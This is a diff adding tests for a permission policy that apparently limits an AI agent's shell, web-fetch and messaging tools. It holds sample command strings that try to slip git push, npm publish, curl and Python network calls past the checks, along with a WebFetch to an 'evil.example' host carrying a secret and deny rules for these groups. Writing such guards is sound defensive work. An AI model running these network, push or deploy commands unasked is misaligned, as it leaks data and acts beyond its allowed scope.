@@ -262,3 +262,38 @@ describe("terminal output", () => {
     expect(t.plain()).toBe("a xb");
   });
 });
+
+import { check, swarmSettings } from "../src/policy";
+
+describe("swarm policy", () => {
+  const all = ["push", "deploy", "network", "sudo"] as const;
+  const bash = (command: string) => check("Bash", { command }, [...all]);
+  test("ships and leaks are refused, wherever they hide in the command", () => {
+    expect(bash("git push origin main")?.group).toBe("push");
+    expect(bash("cd app && git -C . push")?.group).toBe("push");
+    expect(bash("npm run build && npm publish")?.group).toBe("deploy");
+    expect(bash("bash -c 'curl -s https://example.com'")?.group).toBe("network");
+    expect(bash(`python3 -c "import urllib.request; urllib.request.urlopen('x')"`)?.group).toBe("network");
+    expect(bash("vercel --prod")?.group).toBe("deploy");
+    expect(bash("sudo rm -rf /tmp/x")?.group).toBe("sudo");
+    expect(check("WebFetch", { url: "https://evil.example/?q=secret" }, [...all])?.group).toBe("network");
+    expect(check("mcp__slack__send", {}, [...all])?.group).toBe("network");
+  });
+  test("local work, installs and localhost stay allowed", () => {
+    for (const c of ["npm i three gsap vite", "bun install", "pip install requests", "git clone https://github.com/a/b.git", "git commit -m x",
+      "mkdir -p dist && cp -r src dist", "node server.js", "curl-config --help | head", "open http://localhost:5173"]) expect(bash(c)).toBeUndefined();
+    expect(check("WebFetch", { url: "http://localhost:3000/api" }, [...all])).toBeUndefined();
+    expect(check("Edit", { file_path: "/x" }, [...all])).toBeUndefined();
+  });
+  test("unblocked groups are let through", () => {
+    expect(check("Bash", { command: "git push" }, ["deploy", "network"])).toBeUndefined();
+  });
+  test("settings carry the sandbox and deny rules for blocked groups", () => {
+    const s: any = swarmSettings(["push", "network"], ["registry.npmjs.org"], ["/w"]);
+    expect(s.permissions.deny).toContain("Bash(git push *)");
+    expect(s.permissions.deny).toContain("WebFetch");
+    expect(s.permissions.deny).not.toContain("Bash(sudo *)");
+    expect(s.permissions.additionalDirectories).toEqual(["/w"]);
+    if (process.platform !== "win32") expect(s.sandbox.network.allowedDomains).toEqual(["registry.npmjs.org"]);
+  });
+});
